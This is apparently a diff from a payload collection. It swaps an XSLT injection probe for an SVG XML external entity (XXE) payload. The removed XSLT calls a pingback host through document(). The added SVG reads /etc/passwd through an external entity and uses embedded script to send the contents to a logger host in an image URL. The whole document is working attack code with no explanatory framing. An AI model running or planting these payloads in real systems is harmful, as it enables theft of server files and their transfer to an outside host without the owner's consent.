@@ -1,12 +1,15 @@
-<?xml version="1.0"?>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="19000px" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<text x="-1000" y="-1000" >&xxe;</text>
+<circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+<script>
+var logger = "http://logger.local/?file=" + encodeURIComponent(document.getElementsByTagName("text")[0].innerHTML);
+document.createElementNS('http://www.w3.org/2000/svg','image').setAttributeNS('http://www.w3.org/1999/xlink','href', logger);
 
-<xsl:stylesheet version="1.0"
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-<xsl:template match="/">
-    XSLT Version: <xsl:value-of select="system-property('xsl:version')" />
-    XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
-    XSLT Vendor URL: <xsl:value-of select="system-property('xsl:version-url')" />
-    <xsl:variable name="name3" select="document('http://pingb.in/4cd02dfed1c894c72e0752a5a99a')" />
-    aaaaaaa
-</xsl:template>
-</xsl:stylesheet>
+</script>
+
+</svg>
